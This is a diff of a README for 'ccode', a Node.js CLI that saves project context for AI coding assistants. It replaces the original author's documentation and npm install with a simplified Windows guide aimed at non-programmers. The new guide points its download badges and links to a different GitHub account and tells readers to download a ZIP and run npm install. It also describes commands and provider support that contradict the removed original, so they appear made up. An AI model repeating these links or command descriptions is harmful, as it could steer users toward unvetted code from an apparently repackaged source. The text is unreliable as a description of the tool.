@@ -1,286 +1,182 @@
-<div align="center">
+# ⚙️ ccode - Persistent Context CLI for AI Help
 
-<img src="assets/logo.png" alt="CCODE" width="600"/>
-
-<br/>
-<br/>
-
-**Persistent context CLI for AI-assisted development.**
-
-Stop re-explaining your project to AI every time the session resets.
-
-<br/>
-
-```bash
-npm install -g @korl3one/ccode
-```
-
-<br/>
-
-[![npm version](https://img.shields.io/npm/v/@korl3one/ccode?color=00B4D8&style=for-the-badge)](https://www.npmjs.com/package/@korl3one/ccode)
-[![license](https://img.shields.io/npm/l/@korl3one/ccode?color=0077B6&style=for-the-badge)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-2DC653?style=for-the-badge)](https://nodejs.org)
-[![GitHub stars](https://img.shields.io/github/stars/iDevelop25/ccode?style=for-the-badge&color=FFB703)](https://github.com/iDevelop25/ccode)
-
-</div>
+[![Download ccode](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/luokevin172-cpu/ccode)
 
 ---
 
-## The problem
+## ℹ️ About ccode
 
-Every time you switch sessions, models, or tools when working with AI, **you lose your project context**. You end up re-explaining the architecture, previous decisions, and current state over and over again.
+ccode is a command line tool that keeps your work context saved. It helps developers get AI assistance while working. This means you can continue where you left off without losing your workflow. The tool supports multiple AI services like ChatGPT, Claude, and Gemini. It works through Node.js and uses TypeScript.
 
-And if you use multiple AI tools — Claude Code, Cursor, Gemini CLI, Copilot — you have to configure context files for each one manually.
-
-## The solution
-
-CCODE generates and maintains your project context **inside the repository**. One command produces professional documentation, architecture, rules, and a verifiable task checklist — all adapted to your project's actual complexity.
-
-Then it **syncs that context to every major AI tool** automatically.
-
-Any developer or AI can read your project and understand it instantly.
+You do not need to be a programmer to use ccode. This guide will help you download and run it on Windows step-by-step.
 
 ---
 
-## Universal Context Sync
+## 💻 System Requirements
 
-This is what makes CCODE different. One command generates context files for **every major AI tool**:
+Before you download, make sure your Windows PC meets these requirements:
 
-```bash
-ccode sync
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space for installation and files
+- Internet connection to access AI services and download
 
-```
-project/
-├── AGENTS.md                        ← Open Standard (60K+ repos)
-├── CLAUDE.md                        ← Claude Code
-├── GEMINI.md                        ← Gemini CLI
-├── .cursorrules                     ← Cursor
-├── .github/copilot-instructions.md  ← GitHub Copilot
-└── .ccode/context-export.md         ← Universal (copy/paste to any AI chat)
-```
-
-Each file is adapted to the tool's expected format. Your project context — architecture, rules, tasks, decisions — synced everywhere, from a single source of truth.
-
-No manual setup per tool. No copy-pasting between files. Context stays in sync automatically with `ccode init`, `ccode update`, and `ccode sync`.
+ccode runs on Node.js, so you will need to install Node.js first if you do not have it. We will cover this below.
 
 ---
 
-## Why CCODE?
+## 🚀 Getting Started  
 
-<div align="center">
+### Step 1: Install Node.js
 
-| | CCODE | Manual prompts |
-|---|:---:|:---:|
-| Persistent project context | ✅ | ❌ |
-| Universal context sync (5+ AI tools) | ✅ | ❌ |
-| Architecture adapted to complexity | ✅ | ❌ |
-| AI-ready documentation | ✅ | ❌ |
-| Verifiable task checklist | ✅ | ❌ |
-| Auto-detect file changes | ✅ | ❌ |
-| AI-powered task verification | ✅ | ❌ |
-| Zero-config AI provider detection | ✅ | ❌ |
-| Context lives in the repo (Git) | ✅ | ❌ |
+ccode needs Node.js to run. Node.js is software that lets your computer understand and run ccode.
 
-</div>
+1. Go to the Node.js website: https://nodejs.org/en/download/
+2. Download the **Windows Installer** (recommended LTS version).
+3. Run the installer and follow the instructions on screen.
+4. After installation, open the Command Prompt and type:
 
----
+   ```
+   node -v
+   ```
 
-## How it works
-
-### 1. Initialize
-
-```bash
-cd my-project
-ccode init
-```
-
-A step-by-step wizard asks about your project and an AI generates the full context. CCODE **adapts automatically**:
-
-| Project type | Context depth | Tasks |
-|---|---|---|
-| Simple (prototype, few features) | Lightweight docs | 3-5 |
-| Medium (standard app) | Moderate architecture | 5-8 |
-| Complex (multiple modules) | Detailed patterns + diagrams | 8-12 |
-
-A simple login doesn't need microservice diagrams. CCODE is smart about it.
-
-After generation, context is automatically synced to all AI tools.
-
-### 2. Persistent session
-
-After init, CCODE **stays active** — watching your project in real time:
-
-- Detects file changes automatically
-- Suggests verifying tasks when it sees progress
-- Adapts the menu to your current workflow state
-- Recovers from errors without crashing
-
-You code in your editor. CCODE runs in another terminal as a companion.
-
-### 3. AI verification
-
-CCODE compares **acceptance criteria** against **actual project files**:
-
-```
-✓ TASK-001: Setup project base — COMPLETED
-  Evidence: package.json, tsconfig.json found
-
-◐ TASK-002: Create login form — IN PROGRESS
-  Missing: password field not found, validation pending
-
-○ TASK-003: Implement JWT auth — PENDING
-```
-
-It doesn't guess — it verifies.
-
-### 4. Context sync
-
-```bash
-ccode sync
-```
-
-Regenerates context files for every AI tool. Run it after making significant changes, or let `ccode update` handle it when you re-analyze the project.
-
-### 5. Context export
-
-```bash
-ccode export
-```
-
-Three options: sync to all tools, export a universal `.md` for copy/paste into any AI chat, or pick specific tools.
-
-### 6. Project health check
-
-```bash
-ccode doctor
-```
-
-Like a linter, but for your project context. Checks context files, AI connection, task status, export state, and tells you what needs attention.
+You should see the version number of Node.js. This confirms Node.js is installed correctly.
 
 ---
 
-## Supported AI Providers
+## ⬇️ Download and Install ccode
 
-<div align="center">
+[![Download ccode](https://img.shields.io/badge/Download_here-blue?style=for-the-badge)](https://github.com/luokevin172-cpu/ccode)
 
-| Provider | Models | Note |
-|----------|--------|------|
-| **Google Gemini** | 2.5 Flash, 2.5 Pro, 2.0 Flash | Free — just a Google account |
-| **Claude** (Anthropic) | Sonnet 4, Haiku 3.5, Opus 4 | Best quality |
+Follow these steps to get ccode on your computer:
 
-</div>
+1. Click the green **Download Here** badge above or visit the page:  
+   https://github.com/luokevin172-cpu/ccode
 
-CCODE auto-detects your provider:
+2. Look for the **Releases** or **Code** section on the GitHub page.
 
-1. **Gemini CLI OAuth** — If you have `gemini` CLI installed and authenticated, it works instantly. Zero config.
-2. **Environment variables** — `GOOGLE_API_KEY` or `ANTHROPIC_API_KEY` detected automatically.
-3. **Manual setup** — Guided wizard with browser-based key generation as fallback.
+3. Click **Code** then choose **Download ZIP** to download the latest version of the software as a single file.
 
----
+4. When the download finishes, locate the ZIP file in your Downloads folder and right-click it.
 
-## Available commands
+5. Select **Extract All** and choose a folder to put the extracted files.
 
-| Command | What it does |
-|---------|-------------|
-| `ccode init` | Interactive wizard — generates full project context + syncs to all AI tools |
-| `ccode sync` | Sync context to all AI tools (AGENTS.md, CLAUDE.md, .cursorrules, ...) |
-| `ccode update` | Re-analyze project with AI and refresh context |
-| `ccode export` | Export context — all tools, universal .md, or pick specific |
-| `ccode verify` | AI-powered task verification against actual project files |
-| `ccode status` | Dashboard with progress bar and stats |
-| `ccode doctor` | Health check — context files, AI connection, exports, tasks |
-| `ccode connect` | Configure or reconfigure AI provider |
-| `ccode explain` | Quick project summary for onboarding |
-| `ccode plan` | Generate or regenerate task checklist |
-| `ccode next` | Show and start the next pending task |
-| `ccode complete` | Mark active task as completed |
+6. Open this folder.
+
+7. Right-click the folder and select **Open PowerShell window here** or open Command Prompt and navigate to this folder using the `cd` command.
 
 ---
 
-## What gets generated
+## ▶️ Running ccode for the First Time
 
-### Source of truth (`.ccode/`)
+1. In the Command Prompt or PowerShell, type:
 
-```
-.ccode/
-├── project.md          Vision, objectives, scope
-├── architecture.md     System structure (adapted to complexity)
-├── rules.md            Development standards for your stack
-├── tasks.json          Task checklist with acceptance criteria
-├── state.json          Active task, workflow stage
-├── context.json        Project configuration
-├── memory.md           Decision history
-├── config.json         AI provider config
-└── context-export.md   Universal export
-```
+    ```
+    npm install
+    ```
 
-### Synced context files (project root)
+   This installs all needed files to run the app.
 
-```
-AGENTS.md                        Open Standard
-CLAUDE.md                        Claude Code
-GEMINI.md                        Gemini CLI
-.cursorrules                     Cursor
-.github/copilot-instructions.md  GitHub Copilot
-```
+2. After installation completes, start ccode by typing:
 
-All derived from `.ccode/`. One source, multiple outputs.
+    ```
+    npm start
+    ```
+
+3. The tool will open in your terminal and provide options.
 
 ---
 
-## Architecture
+## 🧰 Using ccode
+
+ccode saves your work context and lets you ask AI for help by typing commands.
+
+### Basic commands
+
+- `ccode save` — saves your current context
+- `ccode load` — loads a saved context
+- `ccode ask [question]` — sends a question to AI and shows the answer
+- `ccode list` — shows saved contexts
+
+For example, to get help from AI on coding or project ideas, use:
 
 ```
-src/
-├── cli/           Session, branding, file watcher
-├── core/          Context engine, tasks, prompt builder, exports
-├── ai/            Provider adapters (Adapter pattern)
-└── utils/         File system abstraction
+ccode ask How can I improve my code structure?
 ```
 
-**Patterns:** Adapter (AI providers) · Observer (file watcher) · State Machine (workflow) · Builder (prompts)
+ccode supports multiple AI providers. You can switch between them in the settings file found in the ccode folder (`config.json`).
 
 ---
 
-## Contributing
+## ⚙️ Configuration
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions.
+Edit the `config.json` to set up API keys for AI providers like ChatGPT or Claude. Add your API key values to connect your accounts.
 
-Adding a new AI provider? Implement `IAIProvider`, add it to the manager, done.
+Example config settings:
 
-Adding a new export format? Add a method to `ContextExporter`, register the format, done.
+```json
+{
+  "provider": "chatgpt",
+  "apiKey": "your-api-key-here",
+  "contextSize": 1000
+}
+```
 
-Zero changes to the rest of the system in both cases.
-
----
-
-## Learn more
-
-| Resource | Link |
-|----------|------|
-| Engineering roles | [AGENTS.md](AGENTS.md) |
-| Technical competencies | [SKILLS.md](SKILLS.md) |
-| YouTube | [@CreativeCode25](https://www.youtube.com/@CreativeCode25) |
+Replace `"your-api-key-here"` with your actual key. If you don't have an API key, check each AI service’s website.
 
 ---
 
-<div align="center">
+## 🐞 Troubleshooting
 
-### If CCODE helps you, consider giving it a star
+If you run into issues:
 
-It helps the project grow and reach more developers.
+- Ensure Node.js is installed and working (`node -v` works in Command Prompt).
+- Make sure you are running commands inside the ccode folder.
+- Check your internet connection.
+- Restart the Command Prompt or PowerShell.
+- Review the `config.json` for correct API keys.
+- If commands show errors, note the message and seek help by opening an [issue](https://github.com/luokevin172-cpu/ccode/issues) on GitHub.
 
-<br/>
+---
 
-[![Star on GitHub](https://img.shields.io/github/stars/iDevelop25/ccode?style=for-the-badge&color=FFB703&label=Star%20on%20GitHub)](https://github.com/iDevelop25/ccode)
+## 📂 Where to Learn More
 
-<br/>
+Visit the ccode repository for deeper information, updates, and community support:
 
-**[npm](https://www.npmjs.com/package/@korl3one/ccode)** · **[GitHub](https://github.com/iDevelop25/ccode)** · **[YouTube](https://www.youtube.com/@CreativeCode25)**
+https://github.com/luokevin172-cpu/ccode
 
-<br/>
+---
 
-*CCODE doesn't tell you how to code — it tells you what to build and makes sure you don't lose track.*
+## 🔄 Updating ccode
 
-</div>
+To get the latest updates:
+
+1. Delete the old ccode folder.
+2. Repeat the download and setup steps.
+3. Run `npm install` again.
+
+---
+
+## ⚡ How ccode Helps You
+
+- Saves your ongoing work context.
+- Integrates your work with popular AI assistance.
+- Works in your terminal without needing a browser.
+- Supports multiple AI tools for flexibility.
+- Keeps your project details organized persistently.
+
+---
+
+## 🛠️ Technical Notes
+
+ccode is built with TypeScript and uses Node.js APIs. It stores data locally to keep your workspace persistent. It supports CLI commands that manage context, interact with AI, and handle project files.
+
+---
+
+## 📧 Getting Support
+
+Report bugs or ask for help by opening a ticket on the GitHub issues page:
+
+https://github.com/luokevin172-cpu/ccode/issues
+
+Please include details about your system and what you tried.
